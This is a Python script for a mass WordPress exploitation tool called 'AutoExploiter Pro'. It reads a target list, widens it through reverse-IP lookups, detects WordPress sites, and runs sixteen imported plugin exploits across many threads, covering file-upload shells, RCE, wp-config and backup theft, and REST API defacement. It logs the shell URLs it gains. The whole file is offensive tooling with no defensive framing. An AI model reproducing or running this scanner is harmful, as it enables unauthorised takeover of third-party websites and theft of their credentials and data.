import os
import random
import requests
import threading
import json
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init(autoreset=True)

# Import all exploits
from exploits import (
    exploit_revslider_fileupload,
    exploit_wpfilemanager_rce,
    exploit_contactform7_upload,
    exploit_elementor_fileupload,
    exploit_fusionbuilder_fileupload,
    exploit_gravityforms_rce,
    exploit_duplicator_backupdownload,
    exploit_wysija_newsletters_upload,
    exploit_seoplugin_xss,
    exploit_wp_ajax_upload,
    exploit_wp_restapi_deface,
    exploit_duplicator_backup_leak,
    exploit_gdpr_compliance_admin,
    exploit_wp_db_backup_download,
    exploit_wp_live_chat_fileupload,
    exploit_wp_config_download
)

# Banner
def banner():
    ascii_art = f"""{Fore.RED}
 ██████╗ ██╗     ██╗   ██╗████████╗████████╗ ██████╗ ███╗   ██╗██╗   ██╗
██╔════╝ ██║     ██║   ██║╚══██╔══╝╚══██╔══╝██╔═══██╗████╗  ██║╚██╗ ██╔╝
██║  ███╗██║     ██║   ██║   ██║      ██║   ██║   ██║██╔██╗ ██║ ╚████╔╝ 
██║   ██║██║     ██║   ██║   ██║      ██║   ██║   ██║██║╚██╗██║  ╚██╔╝  
╚██████╔╝███████╗╚██████╔╝   ██║      ██║   ╚██████╔╝██║ ╚████║   ██║   
 ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═══╝   ╚═╝                                                                      
{Style.RESET_ALL}
{Fore.CYAN}Developed By: LYNSS {Style.RESET_ALL}
"""
    print(ascii_art)
    print(Fore.YELLOW + "AutoExploiter Pro - WordPress Exploitation Tool")

# Settings before start
def pro_mode_settings():
    print(Fore.MAGENTA + "\n--- Pro Mode Settings ---")

    threads = input("Threads (default 30): ").strip()
    timeout = input("Timeout (default 8 sec): ").strip()
    retries = input("Retries (default 3): ").strip()
    reverse_ip = input("Enable Reverse IP lookup? (y/N): ").strip().lower()

    settings = {
        "threads": int(threads) if threads else 30,
        "timeout": int(timeout) if timeout else 8,
        "retries": int(retries) if retries else 3,
        "reverse_ip": True if reverse_ip == "y" else False
    }
    return settings

# Load targets from file
def load_targets(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Save successful shell
def save_shell(shell_info):
    with open('shell.txt', 'a') as f:
        f.write(f"{shell_info['shell_url']}\n")

# Save failed target
def save_failed(site_url):
    with open('failed.txt', 'a') as f:
        f.write(f"{site_url}\n")

# Save error
def save_error(site_url, exploit_name, error):
    with open('errors.txt', 'a') as f:
        f.write(f"{site_url} - {exploit_name} - {error}\n")

# Random user-agent
def get_random_useragent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 10; SM-G970F)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0)",
        "Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6)",
    ]
    return random.choice(user_agents)

# Setup session
session = requests.Session()

def setup_session(retries):
    retry_strategy = requests.packages.urllib3.util.retry.Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

# Check WordPress
def is_wordpress(site_url, timeout=8):
    try:
        headers = {'User-Agent': get_random_useragent()}
        r = session.get(site_url, headers=headers, timeout=timeout, allow_redirects=True)
        if any(keyword in r.text for keyword in ("wp-content", "wp-includes", "generator\" content=\"WordPress")):
            return True
    except Exception:
        pass
    return False

# Reverse IP Lookup
def reverse_ip_lookup(ip_address):
    try:
        url = f"https://api.hackertarget.com/reverseiplookup/?q={ip_address}"
        r = session.get(url, timeout=10)
        if "error" not in r.text.lower():
            domains = r.text.strip().split("\n")
            return domains
    except Exception:
        pass
    return []

# Exploits list
exploits_list = [
    exploit_revslider_fileupload,
    exploit_wpfilemanager_rce,
    exploit_contactform7_upload,
    exploit_elementor_fileupload,
    exploit_fusionbuilder_fileupload,
    exploit_gravityforms_rce,
    exploit_duplicator_backupdownload,
    exploit_wysija_newsletters_upload,
    exploit_seoplugin_xss,
    exploit_wp_ajax_upload,
    exploit_wp_restapi_deface,
    exploit_duplicator_backup_leak,
    exploit_gdpr_compliance_admin,
    exploit_wp_db_backup_download,
    exploit_wp_live_chat_fileupload,
    exploit_wp_config_download
]

# Main Attack Logic
def attack(site):
    print(Fore.CYAN + f"\n[*] Target: {site}")

    if not is_wordpress(site, timeout=settings['timeout']):
        print(Fore.YELLOW + f"[-] {site} is not WordPress. Skipping.")
        save_failed(site)
        return

    for exploit in exploits_list:
        print(Fore.CYAN + f"[*] Trying exploit: {exploit.__name__}")
        try:
            success, shell_url = exploit.exploit(site)
            if success:
                shell_info = {
                    "site": site,
                    "exploit": exploit.__name__,
                    "shell_url": shell_url,
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                print(Fore.GREEN + f"[+] Exploited successfully: {shell_url}")
                save_shell(shell_info)
                break  # This stops after the first successful exploit
        except Exception as e:
            print(Fore.RED + f"[-] {exploit.__name__} error: {e}")
            save_error(site, exploit.__name__, str(e))
    else:
        print(Fore.RED + f"[-] All exploits failed for {site}")
        save_failed(site)

def main():
    global settings
    banner()
    settings = pro_mode_settings()
    setup_session(settings['retries'])

    targets = load_targets('websites.txt')

    # Expand targets with Reverse IP
    if settings['reverse_ip']:
        print(Fore.YELLOW + "[*] Expanding targets via Reverse IP lookup...")
        expanded_targets = []
        for target in targets:
            try:
                ip = requests.get(f"https://api.hackertarget.com/dnslookup/?q={target}").text
                ip = ip.split('Address: ')[1].splitlines()[0].strip()
                domains = reverse_ip_lookup(ip)
                if domains:
                    print(Fore.GREEN + f"[+] Found {len(domains)} domains for {target}")
                    expanded_targets.extend(domains)
            except Exception:
                pass
        targets.extend(expanded_targets)
        targets = list(set(targets))  

    print(Fore.YELLOW + f"[*] Total targets to scan: {len(targets)}")

    with ThreadPoolExecutor(max_workers=settings['threads']) as executor:
        executor.map(attack, targets)

if __name__ == "__main__":
    main()
